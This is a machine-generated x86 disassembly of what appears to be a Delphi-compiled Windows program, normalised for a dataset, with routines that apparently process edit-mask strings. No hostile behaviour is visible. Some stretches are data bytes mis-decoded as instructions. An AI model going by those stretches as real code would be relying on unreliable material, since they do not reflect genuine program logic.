mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_434d54
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_453d58
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_456318
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_455f34
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_455f34
jmp r-xdata
sub_456758
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_403ecc
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_403ecc
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_456794
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_435d5c
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_435d5c
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_4414f8
sub_456824
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_45684c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_4568f0
add [ eax ] eax
add [ eax ] al
les ebp [ esi + eax * 2 + 0x4312b400 ]
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_456953
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45695a
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_44c2b0
mov eax sub_44c530
call sub_4133ec
mov eax [ rw-data ]
push eax
call CloseHandle
sub_4569b0
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x0
mov eax esi
call sub_404138
cmp edi eax
jg r-xdata
mov eax esi
call sub_404138
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
mov [ esp ] al
mov edx edi
mov eax esi
call sub_40bcb8
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp edi 0x1
jle r-xdata
mov bl 0x1
jmp r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
cmp al [ rw-data ]
jne r-xdata
cmp [ esi + edi - 0x2 ] 0x5c
jne r-xdata
mov eax esi
call sub_404138
cmp eax 0x4
jl r-xdata
mov eax esi
call sub_404138
cmp eax 0x4
jl r-xdata
mov edx edi
dec edx
mov eax esi
call sub_40bcb8
test al al
jne r-xdata
mov al [ esp ]
sub al 0x2f
je r-xdata
mov eax esi
call sub_404138
sub eax 0x4
cmp edi eax
jle r-xdata
mov eax esi
call sub_404138
sub eax 0x4
cmp edi eax
jle r-xdata
cmp edi 0x2
jle r-xdata
mov bl 0x2
jmp r-xdata
sub al 0xb
jne r-xdata
mov al [ esi + edi - 0x2 ]
cmp al [ rw-data ]
jne r-xdata
mov bl 0x6
jmp r-xdata
mov bl 0x1
jmp r-xdata
cmp [ esi + edi - 0x3 ] 0x5c
jne r-xdata
mov al [ esp ]
sub al 0x21
je r-xdata
cmp edi 0x2
jle r-xdata
mov edx edi
sub edx 0x2
mov eax esi
call sub_40bcb8
test al al
je r-xdata
mov bl 0x3
jmp r-xdata
sub al 0x1b
je r-xdata
mov bl 0x7
jmp r-xdata
cmp [ esi + edi - 0x3 ] 0x5c
jne r-xdata
sub al 0x2
je r-xdata
mov edx edi
sub edx 0x2
mov eax esi
call sub_40bcb8
cmp al 0x2
jne r-xdata
sub al 0x1e
jne r-xdata
mov al [ esp ]
sub al 0x23
je r-xdata
mov bl 0x5
jmp r-xdata
sub al 0x16
je r-xdata
sub al 0x28
je r-xdata
sub al 0x2
je r-xdata
sub al 0x9
jne r-xdata
mov al [ esp ]
sub al 0x30
je r-xdata
mov bl 0x4
sub al 0x11
je r-xdata
sub al 0x2
je r-xdata
sub al 0x9
jne r-xdata
sub_456b04
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov bl [ r-xdata ]
mov eax edi
call sub_404138
mov esi eax
test esi esi
jle r-xdata
mov edx [ esp ]
mov eax edi
call sub_4569b0
cmp al 0x1
jne r-xdata
mov ebp 0x1
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
or bl 0x8
cmp al 0x3e
jne r-xdata
or bl 0x1
jmp r-xdata
cmp al 0x3c
jne r-xdata
cmp ebp [ esp ]
jge r-xdata
inc ebp
dec esi
jne r-xdata
cmp ebp [ esp ]
jge r-xdata
and bl 0xfb
cmp ebp 0x1
jle r-xdata
mov al [ edi + ebp - 0x1 ]
cmp al 0x21
jne r-xdata
and bl 0xfd
or bl 0x4
or bl 0x2
jmp r-xdata
cmp [ edi + ebp - 0x2 ] 0x3c
je r-xdata
sub_456b80
mov edx eax
sub al 0x2f
je r-xdata
mov edx [ rw-data ]
mov dl [ edx ]
sub al 0xb
jne r-xdata
mov eax edx
retn
mov edx [ rw-data ]
mov dl [ edx ]
mov eax edx
retn
sub_456ba0
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
mov [ ebp - 0x5 ] cl
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_456daa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx esi
call sub_403ecc
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_456b04
mov [ ebp - 0x11 ] al
test [ ebp - 0x11 ] 0x1
jne r-xdata
mov eax [ ebx ]
call sub_404138
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_404138
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x10 ] 0x1
mov eax [ ebp - 0x4 ]
call sub_404138
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456db1
lea eax [ ebp - 0x38 ]
mov edx 0x8
call sub_403e9c
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x18 ] eax
mov esi 0x1
add al 0xfc
sub al 0x2
jae r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx ]
mov ecx [ ebp - 0x10 ]
mov edx 0x1
call sub_404398
push [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov al [ eax + esi - 0x1 ]
call sub_456b80
mov edx eax
lea eax [ ebp - 0x30 ]
call sub_404060
push [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebx ]
call sub_404138
mov ecx eax
sub ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x10 ]
inc edx
mov eax [ ebx ]
call sub_404398
push [ ebp - 0x34 ]
mov eax ebx
mov edx 0x3
call sub_4041f8
jmp r-xdata
add al 0xfc
sub al 0x2
jae r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp - 0x10 ]
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_404398
push [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov al [ eax + esi - 0x1 ]
call sub_456b80
mov edx eax
lea eax [ ebp - 0x20 ]
call sub_404060
push [ ebp - 0x20 ]
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
call sub_404138
mov ecx eax
sub ecx [ ebp - 0x10 ]
inc ecx
mov eax [ ebx ]
mov edx [ ebp - 0x10 ]
call sub_404398
push [ ebp - 0x24 ]
mov eax ebx
mov edx 0x3
call sub_4041f8
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x18 ]
jne r-xdata
cmp [ ebp - 0x10 ] 0x1
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebx ]
call sub_404138
cmp eax [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_404138
mov esi eax
sub esi [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4569b0
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x38 ]
mov dl [ ebp - 0x5 ]
call sub_404060
mov edx [ ebp - 0x38 ]
mov ecx [ ebx ]
mov eax ebx
call sub_404184
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4569b0
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
jmp r-xdata
inc [ ebp - 0x10 ]
lea eax [ ebp - 0x28 ]
mov dl [ ebp - 0x5 ]
call sub_404060
mov edx [ ebp - 0x28 ]
mov eax ebx
call sub_404140
sub_456dbc
push ebx
push esi
push edi
push ebp
push ecx
mov esi eax
mov [ esp ] 0x1
mov eax esi
call sub_404138
cmp eax 0x4
jl r-xdata
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
or ebp 0xffffffff
or edi 0xffffffff
mov eax esi
call sub_404138
mov ebx eax
dec ebx
test ebx ebx
jle r-xdata
test ebp ebp
jge r-xdata
test edi edi
jge r-xdata
mov eax esi
call sub_404138
sub eax 0x4
cmp ebx eax
jl r-xdata
mov edi ebx
mov ebp ebx
jmp r-xdata
test edi edi
jle r-xdata
mov edi ebp
test edi edi
jl r-xdata
mov eax esi
call sub_404138
cmp edi eax
je r-xdata
mov edx ebx
mov eax esi
call sub_4569b0
cmp al 0x6
jne r-xdata
mov al [ esi + edi ]
cmp al [ rw-data ]
sete al
xor al 0x1
mov [ esp ] al
sub_456e40
push ebx
push esi
mov esi eax
mov bl [ rw-data ]
mov eax esi
call sub_404138
cmp eax 0x4
jl r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_404138
mov edx eax
dec edx
mov eax esi
call sub_4569b0
cmp al 0x6
jne r-xdata
mov eax esi
call sub_404138
mov edx eax
sub edx 0x2
mov eax esi
call sub_4569b0
cmp al 0x6
je r-xdata
mov eax esi
call sub_404138
mov bl [ esi + eax - 0x1 ]
mov eax esi
call sub_404138
mov edx eax
sub edx 0x3
mov eax esi
call sub_4569b0
cmp al 0x6
jne r-xdata
sub_456eac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_456f29
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_403e78
mov esi ebx
test esi esi
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456f30
lea eax [ ebp - 0x8 ]
call sub_403e78
retn
mov ebx 0x1
inc ebx
dec esi
jne r-xdata
add al 0xfd
sub al 0x2
jb r-xdata
mov edx ebx
mov eax edi
call sub_4569b0
sub al 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
mov dl [ edi + ebx - 0x1 ]
call sub_404060
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_404140
mov eax [ ebp - 0x4 ]
sub_456f38
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_456f7d
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_456eac
mov eax [ ebp - 0x4 ]
call sub_404138
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456f84
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_456f8c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx edx
mov edi eax
mov eax edi
call sub_404138
mov edx eax
mov eax edi
call sub_456f38
cmp eax ebx
jge r-xdata
xor ebp ebp
mov [ esp ] ebx
mov eax edi
call sub_404138
mov ebx eax
test ebx ebx
jle r-xdata
or ebp 0xffffffff
jmp r-xdata
mov eax ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi 0x1
inc esi
dec ebx
jne r-xdata
dec [ esp ]
cmp [ esp ] 0x0
jl r-xdata
inc ebp
mov edx esi
mov eax edi
call sub_4569b0
cmp al 0x3
je r-xdata
sub_456fe8
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_456f8c
test eax eax
jl r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4569b0
dec eax
sub al 0x2
setb bl
sub_457010
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x14 ]
xor eax eax
push ebp
push sub_457195
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
sub eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x10 ]
jge r-xdata
mov eax esi
sub eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x10 ]
jle r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_456b04
mov [ ebp - 0x9 ] al
mov eax esi
dec eax
mov [ ebp - 0x10 ] eax
test [ ebp - 0x9 ] 0x1
je r-xdata
mov eax ebx
mov edx edi
call sub_403ecc
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_456b04
mov [ ebp - 0x9 ] al
test [ ebp - 0x9 ] 0x1
je r-xdata
push ebx
mov ecx [ ebp - 0x10 ]
mov edx 0x1
mov eax edi
call sub_404398
sub esi [ ebp - 0x8 ]
mov eax [ ebp + 0x10 ]
sub eax esi
test eax eax
jle r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x24 ]
push eax
mov eax edi
call sub_404138
mov ecx eax
mov edx esi
mov eax edi
call sub_404398
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp + 0x10 ]
dec ecx
mov edx 0x1
mov eax edi
call sub_404398
mov edx [ ebp - 0x28 ]
mov eax ebx
pop ecx
call sub_404184
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_404138
mov ecx eax
mov edx esi
sub edx [ ebp + 0x10 ]
mov eax edi
call sub_404398
mov eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x8 ]
dec ecx
mov edx 0x1
mov eax edi
call sub_404398
mov edx [ ebp - 0x20 ]
mov eax ebx
pop ecx
call sub_404184
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax edi
call sub_404138
mov ecx eax
mov edx [ ebp - 0x10 ]
inc edx
mov eax edi
call sub_404398
mov edx [ ebp - 0x18 ]
mov eax ebx
call sub_404140
jmp r-xdata
mov esi eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45719c
lea eax [ ebp - 0x28 ]
mov edx 0x6
call sub_403e9c
retn
lea eax [ ebp - 0x14 ]
mov dl [ ebp + 0xc ]
call sub_404060
mov edx [ ebp - 0x14 ]
mov eax ebx
call sub_404140
dec esi
jne r-xdata
sub_4571a8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_45736e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx edi
call sub_403ecc
mov eax esi
call sub_404138
test eax eax
jle r-xdata
mov eax esi
call sub_404138
mov edx eax
mov eax esi
call sub_456f38
mov edi eax
mov eax [ ebx ]
call sub_404138
cmp edi eax
je r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x1
mov eax [ ebx ]
call sub_404138
test eax eax
jle r-xdata
mov eax [ ebx ]
call sub_404138
inc eax
push eax
sub edi [ ebp - 0x8 ]
push edi
mov al [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x8 ]
inc ecx
mov edx [ ebx ]
mov eax esi
call sub_457010
mov edx [ ebp - 0x28 ]
mov eax ebx
call sub_403ecc
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_456f38
mov [ ebp - 0x10 ] eax
mov eax [ ebx ]
call sub_404138
inc eax
mov [ ebp - 0xc ] eax
mov edi [ ebp - 0x8 ]
inc edi
mov eax [ ebx ]
call sub_404138
sub eax edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457375
lea eax [ ebp - 0x28 ]
mov edx 0x3
call sub_403e9c
retn
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x10 ] 0x1
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4569b0
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebx ]
call sub_404138
cmp eax [ ebp - 0xc ]
jge r-xdata
inc eax
mov [ ebp - 0x1c ] eax
inc [ ebp - 0x10 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
dec edx
mov eax esi
call sub_456fe8
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
mov edi [ ebp - 0x8 ]
inc edi
mov eax [ ebp - 0x10 ]
sub eax edi
push eax
mov al [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx edi
mov edx [ ebx ]
mov eax esi
call sub_457010
mov edx [ ebp - 0x24 ]
mov eax ebx
call sub_403ecc
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov al [ esi + eax - 0x1 ]
call sub_456b80
mov edx eax
lea eax [ ebp - 0x20 ]
call sub_404060
mov edx [ ebp - 0x20 ]
mov eax ebx
call sub_404140
inc edi
dec [ ebp - 0x1c ]
jne r-xdata
mov [ ebp - 0xc ] edi
jmp r-xdata
mov eax [ ebx ]
mov edx [ ebp - 0x10 ]
cmp [ eax + edx - 0x1 ] 0x20
jne r-xdata
mov eax ebx
call j_sub_404344
mov edx [ ebp - 0x10 ]
mov cl [ ebp - 0x1 ]
mov [ eax + edx - 0x1 ] cl
mov eax [ ebp - 0x14 ]
mov al [ esi + eax - 0x1 ]
call sub_456b80
mov edx [ ebx ]
cmp al [ edx + edi - 0x1 ]
jne r-xdata
sub_457380
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4573a5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4573ac
retn
sub_4573bc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x74
inc ebp
add [ eax + eax ] cl
add [ eax ] al
fsubr [ ebp + 0x40 ]
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x75 ] dh
inc ebp
add al al
jne r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or al 0x45
inc esp
inc edx
inc ebp
imul esi [ fs : ebp + eax * 2 + 0x72 ] 0x8d726f72
inc eax
add [ eax + 0x74 ] ah
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi * 2 + 0x45 ] bl
add ah dl
jne r-xdata
clc
cdq
add [ eax + 0x2 ] al
add [ eax ] al
adc al 0xd6
inc edx
add al ah
cdq
inc ecx
add [ ebx + esi + 0x40 ] bh
add [ ebx + edx * 4 ] dh
inc ecx
inc ecx
add al ah
xchg esi eax
inc ecx
add al bl
xchg esi eax
inc ecx
add [ eax ] al
0x75f80041 0x45
js r-xdata
insb
inc ebx
add [ eax ] al
add [ ebx + esi - 0x1a63ffc0 ] al
inc edx
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
inc ebx
add [ esi + edi * 4 - 0x421fffbd ] dl
inc ebx
add al bh
inc ebx
add [ eax ] bh
mov ah 0x43
add [ eax - 0x4c ] bl
inc ebx
add [ eax - 0x4f ] dh
inc ebx
add [ esi + edi * 4 + 0x43 ] ah
add al dl
xchg [ ebx ] al
je r-xdata
inc edx
add [ edx ] cl
inc edx
add [ eax + 0x680042e0 ] bh
loopne r-xdata
add [ eax + 0x3000437a ] dl
mov [ ebx ] al
test al 0xe2
inc edx
add [ ebx + 0x42 ] ah
add ah dl
jecxz r-xdata
jo r-xdata
add [ eax + eax * 2 + 0x73840043 ] al
inc ebx
add [ ecx + ecx * 2 - 0x6607ffbd ] bl
inc ecx
add [ esp + ebp * 2 + 0x43 ] ah
add ebx [ edx ]
mov al 0x1b
mov al 0x12
mov al 0x1e
add [ eax + eax * 4 - 0x1e8fffbb ] ah
inc edx
loope r-xdata
add al cl
mov [ ebx ] al
int3
add al ah
jno r-xdata
inc ebx
add [ eax + 0x3e ] al
inc ebx
add [ esi + edi + 0x43 ] al
add [ esi + ebp * 2 ] dh
inc ebx
add [ eax + 0x6e ] ah
inc ebx
add [ eax ] dh
fild [ edx ]
mov esp 0x1000433f
dec ebx
inc ebx
add [ eax - 0x63ffbcb6 ] cl
dec ebp
inc ebx
add [ eax + 0x4c ] cl
inc ebx
add [ ebp + ecx * 4 + 0x6ee40043 ] ah
inc ebx
add ah al
mov cl 0x43
add [ eax + 0x7c0043b2 ] al
lodsd [ esi ]
inc ebx
add [ edx + esi * 4 + 0x43 ] ah
add ah bh
jae r-xdata
mov al 0xbc
add [ eax + eax * 4 - 0x7f4fffbb ] ch
inc ebp
add [ eax + edx * 4 ] bl
inc ebp
add [ eax - 0x77 ] ah
inc ebp
add al al
mov [ ebp ] al
push cs
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x20004569 ] ah
add al [ eax ]
add [ eax + edx + 0x2380040 ] dl
add [ eax ] al
or al 0x0
add [ edx ] eax
add al [ edx ]
pop es
add [ eax ] al
add eax [ edx ]
sub_45758c
mov ebx 0xb8ffbaff
ja r-xdata
jne r-xdata
add ah dl
ja r-xdata
push esi
je r-xdata
insd
dec ebp
popad
jae sub_45764c
add [ eax + edi * 2 ] dh
inc ebp
add [ eax - 0x13ffba86 ] bh
jpe r-xdata
mov eax ebx
call sub_457bd4
test al al
je r-xdata
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_43a1bc
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
cmp [ ebx + 0x23c ] 0x0
jne r-xdata
add [ ebx + 0x56 ] dl
inc ebp
imul esi [ fs : eax + 0x74 ] 0xd7880045
inc edx
add [ eax + eax ] cl
add al 0x4d
popad
jae r-xdata
add [ eax + 0xc0042d7 ] cl
add [ ecx * 2 + 0x6b7361 ] al
add [ ebx - 0x7ba9ac40 ] cl
shl [ eax + ecx - 0x7d ] cl
add [ edi + eax * 4 ] dh
inc ebp
add [ eax + ecx * 4 - 0x783bffbb ] cl
inc ebp
add [ eax + ecx * 4 + 0x45 ] dl
add [ esi + esi * 2 + 0x45 ] cl
add [ edi + esi * 2 ] ch
inc ebp
add [ edi + esi * 2 + 0x45 ] bh
add [ edi ] cl
push esp
inc ebx
jne r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
add [ eax ] al
mov eax eax
add eax 0x0
je r-xdata
test [ esp ] 0x2
jne r-xdata
add esp 0xc
mov eax esi
pop esi
pop ebx
retn
pop [ fs : 0x0 ]
insd
dec ebp
popad
jae r-xdata
cmp [ esi ] 0x25
je r-xdata
pop [ 0x0 ]
inc ebp
imul esi [ fs : esp + edx * 8 + 0x75 ] 0xf070045
push esp
inc ebx
mov dx [ esi ]
mov cl [ esp ]
mov eax ebx
call sub_4582b0
test [ esp ] 0x1
jne r-xdata
cmp [ esi ] 0x27
jne r-xdata
test [ esp ] 0x4
jne r-xdata
cmp [ esi ] 0x26
je r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov [ esi ] 0x0
jmp r-xdata
cmp [ esi ] 0x28
jne r-xdata
cmp [ esi ] 0x24
je r-xdata
mov dx [ esi ]
mov cl [ esp ]
mov eax ebx
call sub_458548
mov [ esi ] 0x0
jmp r-xdata
cmp [ esi ] 0x23
jne r-xdata
cmp [ esi ] 0x2e
jne r-xdata
cmp [ esi ] 0x8
jne r-xdata
test [ esp ] 0x1
je r-xdata
mov eax ebx
call sub_458064
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov dx [ esi ]
mov eax ebx
call sub_458618
sub_4575f8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42de68
mov al [ r-xdata ]
mov [ esi + 0x22d ] al
mov eax [ rw-data ]
mov al [ eax ]
mov [ esi + 0x224 ] al
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_45764c
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
cmp [ ebx + 0x23c ] 0x0
jne r-xdata
mov eax ebx
call sub_457bd4
test al al
je r-xdata
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_43a1bc
pop edx
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test [ esp ] 0x2
jne r-xdata
cmp [ esi ] 0x25
je r-xdata
mov dx [ esi ]
mov cl [ esp ]
mov eax ebx
call sub_4582b0
test [ esp ] 0x1
jne r-xdata
cmp [ esi ] 0x27
jne r-xdata
test [ esp ] 0x4
jne r-xdata
cmp [ esi ] 0x26
je r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov [ esi ] 0x0
jmp r-xdata
cmp [ esi ] 0x28
jne r-xdata
cmp [ esi ] 0x24
je r-xdata
mov dx [ esi ]
mov cl [ esp ]
mov eax ebx
call sub_458548
mov [ esi ] 0x0
jmp r-xdata
cmp [ esi ] 0x23
jne r-xdata
cmp [ esi ] 0x2e
jne r-xdata
cmp [ esi ] 0x8
jne r-xdata
test [ esp ] 0x1
je r-xdata
mov eax ebx
call sub_458064
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov dx [ esi ]
mov eax ebx
call sub_458618
sub_45772c
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
cmp [ ebx + 0x23c ] 0x0
jne r-xdata
mov eax ebx
call sub_457bd4
test al al
je r-xdata
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_43a2a4
pop edx
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
cmp [ esi ] 0x25
je r-xdata
test [ esp ] 0x4
je r-xdata
cmp [ esi ] 0x27
jne r-xdata
mov eax ebx
call sub_458064
sub_45777c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_43a374
mov eax esi
call sub_457bd4
test al al
je r-xdata
pop esi
pop ebx
retn
